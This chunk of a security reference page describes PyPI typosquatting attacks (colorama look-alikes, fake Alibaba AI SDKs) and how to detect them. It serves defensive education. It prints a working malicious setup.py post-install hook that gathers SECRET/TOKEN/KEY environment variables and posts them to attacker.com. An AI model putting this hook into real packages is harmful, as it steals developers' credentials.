---
source: "languages/python/supply-chain-deep.md"
title: "PyPI Supply Chain Security: Deep Dive"
heading: "Attack Vector 2: Typosquatting Campaigns"
category: "language-vuln"
language: "python"
severity: "high"
tags: [attack, language-vuln, overview, python, vector]
chunk: 4/10
---

## Attack Vector 2: Typosquatting Campaigns

### Colorama vs. Colourama (2025)

**Source:** https://checkmarx.com/zero-post/python-pypi-supply-chain-attack-colorama/

In May 2025, Checkmarx researchers uncovered a typosquatting campaign targeting `colorama` — one of the most downloaded Python packages (~100M+/week). Attackers named their packages with slight variations:

```python
# Legitimate: colorama
# Typosquatted:
# - colourama   (extra 'u')
# - coloram     (missing 'a')
# - coloramaa   (double 'a')
# - colourma    (British spelling confusion)
```

### How the Attack Worked

```python
# The malicious package had identical API to colorama
# BUT also included a post-install script:

# setup.py (malicious)
from setuptools import setup
from setuptools.command.install import install

class PostInstallCommand(install):
    def run(self):
        # Exfiltrate environment variables
        import os, requests
        env_data = {k: v for k, v in os.environ.items() 
                    if 'SECRET' in k or 'TOKEN' in k or 'KEY' in k}
        requests.post("https://attacker.com/exfil", json=env_data)
        install.run(self)

setup(
    name="colourama",
    version="0.4.6",
    cmdclass={"install": PostInstallCommand},
    # ... legitimate-looking metadata
)
```

### The AI/ML Supply Chain Campaign (2025)

**Source:** https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-pypi-supply-chain-campaign-20260329-csa/

In early 2025, the "TeamPCP" campaign targeted AI/ML developers. Attackers uploaded packages impersonating Alibaba Cloud AI Labs SDKs. The packages:

1. Had legitimate-sounding names like `alibaba-ai-sdk`
2. Included working ML functionality (to avoid suspicion)
3. Contained hidden telemetry that exfiltrated training data and API keys

### Detection

```bash
# Check for typosquatting with pip-audit or guarddog
pip install guarddog
guarddog scan requirements.txt
```

```python
# Programmatic detection
difflib.SequenceMatcher(None, "colorama", "colourama").ratio()
# 0.875 — suspiciously close
```

**References:**
- https://checkmarx.com/zero-post/python-pypi-supply-chain-attack-colorama/
- https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-pypi-supply-chain-campaign-20260329-csa/

---